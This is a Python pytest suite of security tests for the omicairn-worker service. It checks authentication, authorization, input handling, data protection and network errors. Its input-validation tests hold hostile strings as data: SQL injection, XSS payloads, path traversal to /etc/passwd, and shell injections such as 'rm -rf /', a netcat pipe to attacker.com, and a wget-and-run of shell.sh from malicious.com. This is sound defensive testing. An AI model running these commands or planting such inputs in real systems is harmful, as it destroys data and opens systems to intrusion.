"""
Security and defensive testing for omicairn-worker.
Tests authentication, authorization, input validation, and security measures.
"""

import pytest
import json
from unittest.mock import Mock, patch, MagicMock
import hashlib
import base64
import time

# Import classes under test
from handle_dynamic_generation.llm_interface import LlmInterface as DynamicLlmInterface
from handle_dynamic_generation.server_agent import ServerAgent
from server.controller.task import TaskPreviousCheckAPI, TaskDispatchAPI


class TestAuthenticationSecurity:
    """Test authentication mechanisms and security."""
    
    def test_server_agent_authentication_token_validation(self, mock_logger):
        """Test server agent properly validates authentication tokens."""
        with patch('handle_dynamic_generation.server_agent.requests.post') as mock_post:
            # Test valid authentication
            valid_response = Mock()
            valid_response.json.return_value = {"data": "valid_auth_token_123"}
            valid_response.raise_for_status.return_value = None
            mock_post.return_value = valid_response
            
            agent = ServerAgent("valid_user_123")
            assert agent.headers == {"token": "valid_auth_token_123"}
            
            # Verify authentication call was made
            mock_post.assert_called_once()
            call_args = mock_post.call_args
            assert "server/user/login-by-system" in call_args[0][0]
            assert "user_id=valid_user_123" in call_args[0][0]

    def test_server_agent_authentication_failure_handling(self, mock_logger):
        """Test handling of authentication failures."""
        with patch('handle_dynamic_generation.server_agent.requests.post') as mock_post:
            # Mock authentication failure
            error_response = Mock()
            error_response.json.return_value = {"error": "Invalid credentials"}
            error_response.raise_for_status.side_effect = Exception("401 Unauthorized")
            mock_post.return_value = error_response
            
            # Should raise exception on authentication failure
            with pytest.raises(Exception, match="401 Unauthorized"):
                ServerAgent("invalid_user")

    def test_token_expiration_handling(self, mock_logger):
        """Test handling of expired authentication tokens."""
        with patch('handle_dynamic_generation.server_agent.requests.post') as mock_post:
            # Mock initial successful authentication
            auth_response = Mock()
            auth_response.json.return_value = {"data": "expired_token"}
            auth_response.raise_for_status.return_value = None
            
            # Mock subsequent request failure due to expired token
            expired_response = Mock()
            expired_response.status_code = 401
            expired_response.json.return_value = {"error": "Token expired"}
            
            mock_post.side_effect = [auth_response, expired_response]
            
            agent = ServerAgent("test_user")
            
            # Make request that should fail with expired token
            with patch('handle_dynamic_generation.server_agent.requests.get') as mock_get:
                mock_get.return_value = expired_response
                
                result = agent.get_computation_history("node_123")
                assert result.status_code == 401


class TestInputValidationSecurity:
    """Test input validation and sanitization."""
    
    def test_sql_injection_prevention(self, mock_database_globally, mock_logger):
        """Test prevention of SQL injection attacks."""
        from server.dao.node import node_dao
        
        with patch('server.dao.node.session') as mock_session:
            # Test with potentially malicious input
            malicious_inputs = [
                "'; DROP TABLE nodes; --",
                "1' OR '1'='1",
                "node_123'; DELETE FROM nodes WHERE 1=1; --",
                "node_123' UNION SELECT * FROM users --"
            ]
            
            mock_session.query.return_value.filter.return_value.first.return_value = None
            
            for malicious_input in malicious_inputs:
                # DAO should handle malicious input safely
                result = node_dao.find_by_id(malicious_input)
                
                # Verify query was made (ORM should handle sanitization)
                mock_session.query.assert_called()
                
                # Should not cause errors or return unexpected results
                assert result is None

    def test_xss_prevention_in_user_input(self, mock_requests, mock_logger):
        """Test prevention of XSS attacks in user input."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "sanitized_response"}
        mock_requests['post'].return_value = mock_response
        
        llm_interface = DynamicLlmInterface()
        
        # Test with potentially malicious script inputs
        xss_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src='x' onerror='alert(1)'>",
            "'><script>alert('XSS')</script>",
            "\" onmouseover=\"alert('XSS')\""
        ]
        
        for xss_input in xss_inputs:
            response = llm_interface.dynamic_fb(
                user_request=xss_input,
                node_id="test_node",
                history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
                user_id="test_user",
                llm_model="gpt-4o"
            )
            
            # Request should be processed without errors
            assert response.status_code == 200
            
            # Verify request was made (API should handle sanitization)
            mock_requests['post'].assert_called()

    def test_command_injection_prevention(self, mock_requests, mock_logger):
        """Test prevention of command injection attacks."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "secure_response"}
        mock_requests['post'].return_value = mock_response
        
        llm_interface = DynamicLlmInterface()
        
        # Test with command injection attempts
        command_injection_inputs = [
            "; rm -rf /",
            "$(rm -rf /)",
            "`rm -rf /`",
            "&& cat /etc/passwd",
            "| nc attacker.com 1234",
            "; wget http://malicious.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh"
        ]
        
        for injection_input in command_injection_inputs:
            response = llm_interface.dynamic_fb(
                user_request=f"Process this data: {injection_input}",
                node_id="security_test_node",
                history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
                user_id="security_test_user",
                llm_model="gpt-4o"
            )
            
            # Should handle malicious input safely
            assert response.status_code == 200
            
            # Verify API call structure
            call_args = mock_requests['post'].call_args
            request_body = call_args[1]['json']
            
            # Input should be passed as-is to API (API layer handles sanitization)
            assert injection_input in request_body['user_request']

    def test_path_traversal_prevention(self, mock_requests, mock_logger):
        """Test prevention of path traversal attacks."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "secure_file_access"}
        mock_requests['post'].return_value = mock_response
        
        llm_interface = DynamicLlmInterface()
        
        # Test with path traversal attempts
        path_traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for traversal_input in path_traversal_inputs:
            # Test with file_ids parameter that might be vulnerable
            response = llm_interface.dynamic_fb(
                user_request="Process file",
                node_id="file_test_node",
                history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
                user_id="file_test_user",
                llm_model="gpt-4o",
                file_ids=[traversal_input]
            )
            
            # Should handle path traversal attempts safely
            assert response.status_code == 200
            
            # Verify file_ids are passed through (server should validate)
            call_args = mock_requests['post'].call_args
            request_body = call_args[1]['json']
            assert traversal_input in request_body['file_ids']


class TestAuthorizationSecurity:
    """Test authorization and access control."""
    
    def test_unauthorized_access_prevention(self, mock_logger):
        """Test prevention of unauthorized access to protected resources."""
        with patch('server.controller.task.AuthorityGuardianFactory') as mock_guardian_factory, \
             patch('server.controller.task.request') as mock_request, \
             patch('server.controller.task.ResponseManager') as mock_response_manager:
            
            # Mock request data
            mock_request.get_json.return_value = {
                "analysis_id": "protected_analysis_123",
                "node_id_list": ["1", "2"],
                "edge_id_list": ["10"]
            }
            
            # Mock authorization failure
            mock_guardian = Mock()
            mock_guardian.check_authority.side_effect = Exception("Access denied: Insufficient permissions")
            mock_guardian_factory.get_authority_guardian.return_value = mock_guardian
            
            api = TaskDispatchAPI()
            
            # Should raise exception for unauthorized access
            with pytest.raises(Exception, match="Access denied: Insufficient permissions"):
                api.post()
            
            # Verify authorization check was attempted
            mock_guardian.check_authority.assert_called_once()

    def test_user_isolation(self, mock_requests, mock_logger):
        """Test that users can only access their own resources."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "user_specific_data"}
        mock_requests['get'].return_value = mock_response
        
        llm_interface = DynamicLlmInterface()
        
        # Test that user_id is always included in requests
        response = llm_interface.get_node_report(
            node_id="node_123",
            history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
            user_id="isolated_user_123"
        )
        
        assert response.status_code == 200
        
        # Verify user_id is included in URL for isolation
        call_args = mock_requests['get'].call_args
        url = call_args[1]['url']
        assert "isolated_user_123" in url

    def test_privilege_escalation_prevention(self, mock_logger):
        """Test prevention of privilege escalation attempts."""
        with patch('server.controller.task.AuthorityGuardianFactory') as mock_guardian_factory, \
             patch('server.controller.task.request') as mock_request:
            
            # Mock request data with privilege escalation attempt
            mock_request.get_json.return_value = {
                "analysis_id": "analysis_123",
                "node_id_list": ["1", "2"],
                "edge_id_list": ["10"],
                "admin_override": True,  # Attempted privilege escalation
                "sudo": True,           # Another escalation attempt
                "root_access": True     # Another escalation attempt
            }
            
            # Mock guardian that should ignore escalation attempts
            mock_guardian = Mock()
            mock_guardian.get_user_id.return_value = "regular_user_123"
            mock_guardian.check_authority.return_value = True  # Regular user permissions
            mock_guardian_factory.get_authority_guardian.return_value = mock_guardian
            
            api = TaskDispatchAPI()
            
            # Mock task service to verify parameters
            with patch('server.controller.task.task_service') as mock_task_service, \
                 patch('server.controller.task.ResponseManager') as mock_response_manager:
                
                mock_task_service.create.return_value = {"task_id": "task_123"}
                mock_response_manager.new_success_response.return_value = {"code": 200}
                
                result = api.post()
                
                # Verify that escalation parameters are not passed to service
                call_args = mock_task_service.create.call_args[0]
                # Should only have legitimate parameters: analysis_id, node_ids, edge_ids, user_id
                assert len(call_args) == 4
                assert call_args[3] == "regular_user_123"  # user_id should be from guardian


class TestDataProtectionSecurity:
    """Test data protection and privacy measures."""
    
    def test_sensitive_data_filtering(self, mock_requests, mock_logger):
        """Test filtering of sensitive data in requests."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "filtered_response"}
        mock_requests['post'].return_value = mock_response
        
        # Test with data that might contain sensitive information
        sensitive_history = [
            {
                "node": {
                    "id": "node1",
                    "name": "Patient Data Analysis",
                    "sensitive_data": {
                        "ssn": "XXX-XX-XXXX",
                        "credit_card": "XXXX-XXXX-XXXX-XXXX",
                        "password": "<FAKE_PASSWORD>",
                        "api_key": "<FAKE_API_KEY>",
                        "personal_email": "john.doe@email.com"
                    }
                },
                "latestComputation": {
                    "id": "comp1",
                    "result": "Patient analysis complete",
                    "logs": "Processing patient data with ID XXX-XX-XXXX"
                }
            }
        ]
        
        llm_interface = DynamicLlmInterface()
        response = llm_interface.dynamic_fb(
            user_request="Analyze patient data securely",
            node_id="secure_node",
            history=sensitive_history,
            user_id="researcher_123",
            llm_model="gpt-4o"
        )
        
        # Should process request without errors
        assert response.status_code == 200
        
        # Verify request was made (data filtering should happen at API level)
        call_args = mock_requests['post'].call_args
        request_body = call_args[1]['json']
        
        # Sensitive data should be passed as-is (server-side filtering expected)
        assert request_body['nodeHistoryList'] == sensitive_history

    def test_request_logging_security(self, mock_requests, mock_logger):
        """Test that sensitive information is not logged."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "logged_response"}
        mock_requests['post'].return_value = mock_response
        
        llm_interface = DynamicLlmInterface()
        
        # Make request with potentially sensitive user input
        response = llm_interface.dynamic_fb(
            user_request="Process password: <FAKE_PASSWORD>",
            node_id="logging_test_node",
            history=[{
                "node": {"id": "node1", "api_key": "secret_key_123"},
                "latestComputation": {"id": "comp1", "token": "<FAKE_TOKEN>"}
            }],
            user_id="logging_test_user",
            llm_model="gpt-4o"
        )
        
        # Should complete successfully
        assert response.status_code == 200
        
        # Verify logger was called (sensitive data filtering should happen in logger)
        mock_logger.info.assert_called()

    def test_response_data_sanitization(self, mock_requests, mock_logger):
        """Test sanitization of response data."""
        # Mock response that might contain sensitive information
        potentially_unsafe_response = Mock()
        potentially_unsafe_response.status_code = 200
        potentially_unsafe_response.json.return_value = {
            "data": {
                "function_block": "def process_data():\n    api_key = '<FAKE_API_KEY>'\n    return data",
                "metadata": {
                    "internal_token": "<FAKE_TOKEN>",
                    "debug_info": "Connection string: mysql://<user>:<password>@localhost/db"
                }
            }
        }
        mock_requests['post'].return_value = potentially_unsafe_response
        
        llm_interface = DynamicLlmInterface()
        response = llm_interface.dynamic_fb(
            user_request="Generate secure function",
            node_id="sanitization_test",
            history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
            user_id="sanitization_user",
            llm_model="gpt-4o"
        )
        
        # Response should be returned as-is (client-side sanitization if needed)
        assert response.status_code == 200
        response_data = response.json()
        assert "api_key" in response_data["data"]["function_block"]


class TestNetworkSecurity:
    """Test network security measures."""
    
    def test_request_timeout_security(self, mock_logger):
        """Test request timeout handling to prevent hanging connections."""
        import requests
        
        with patch('handle_dynamic_generation.llm_interface.requests.post') as mock_post:
            # Mock timeout exception
            mock_post.side_effect = requests.Timeout("Request timed out")
            
            llm_interface = DynamicLlmInterface()
            
            # Should handle timeout gracefully
            with pytest.raises(requests.Timeout):
                llm_interface.dynamic_fb(
                    user_request="Timeout test",
                    node_id="timeout_node",
                    history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
                    user_id="timeout_user",
                    llm_model="gpt-4o"
                )

    def test_ssl_certificate_validation(self, mock_requests, mock_logger):
        """Test SSL certificate validation in HTTPS requests."""
        import requests
        
        with patch('handle_dynamic_generation.llm_interface.requests.post') as mock_post:
            # Mock SSL certificate error
            mock_post.side_effect = requests.exceptions.SSLError("SSL certificate verification failed")
            
            llm_interface = DynamicLlmInterface()
            
            # Should raise SSL error (not silently ignore)
            with pytest.raises(requests.exceptions.SSLError):
                llm_interface.dynamic_fb(
                    user_request="SSL test",
                    node_id="ssl_node",
                    history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
                    user_id="ssl_user",
                    llm_model="gpt-4o"
                )

    def test_rate_limiting_handling(self, mock_requests, mock_logger):
        """Test handling of rate limiting responses."""
        # Mock rate limiting response
        rate_limit_response = Mock()
        rate_limit_response.status_code = 429
        rate_limit_response.json.return_value = {
            "error": "Too many requests",
            "retry_after": 60
        }
        mock_requests['post'].return_value = rate_limit_response
        
        llm_interface = DynamicLlmInterface()
        response = llm_interface.dynamic_fb(
            user_request="Rate limit test",
            node_id="rate_limit_node",
            history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
            user_id="rate_limit_user",
            llm_model="gpt-4o"
        )
        
        # Should return rate limiting response
        assert response.status_code == 429
        response_data = response.json()
        assert "Too many requests" in response_data["error"]


class TestSecurityHeaders:
    """Test security-related headers and configurations."""
    
    def test_authentication_headers(self, mock_logger):
        """Test that authentication headers are properly set."""
        with patch('handle_dynamic_generation.server_agent.requests.post') as mock_post:
            # Mock login response
            login_response = Mock()
            login_response.json.return_value = {"data": "secure_token_123"}
            mock_post.return_value = login_response
            
            agent = ServerAgent("secure_user")
            
            # Verify authentication headers are set
            assert agent.headers["token"] == "secure_token_123"
            
            # Test that headers are included in subsequent requests
            with patch('handle_dynamic_generation.server_agent.requests.get') as mock_get:
                mock_get.return_value = Mock(json=lambda: {"data": "success"})
                
                agent.get_computation_history("node_123")
                
                # Verify headers were included
                call_args = mock_get.call_args
                assert call_args[1]['headers'] == {"token": "secure_token_123"}

    def test_content_type_validation(self, mock_requests, mock_logger):
        """Test content type validation for API requests."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"data": "content_type_test"}
        mock_requests['post'].return_value = mock_response
        
        llm_interface = DynamicLlmInterface()
        response = llm_interface.dynamic_fb(
            user_request="Content type test",
            node_id="content_type_node",
            history=[{"node": {"id": "node1"}, "latestComputation": {"id": "comp1"}}],
            user_id="content_type_user",
            llm_model="gpt-4o"
        )
        
        # Verify request was made with proper content type
        call_args = mock_requests['post'].call_args
        
        # Should have JSON content type for POST requests with JSON body
        assert 'json' in call_args[1]  # JSON parameter indicates correct content type


if __name__ == '__main__':
    pytest.main([__file__, '-v'])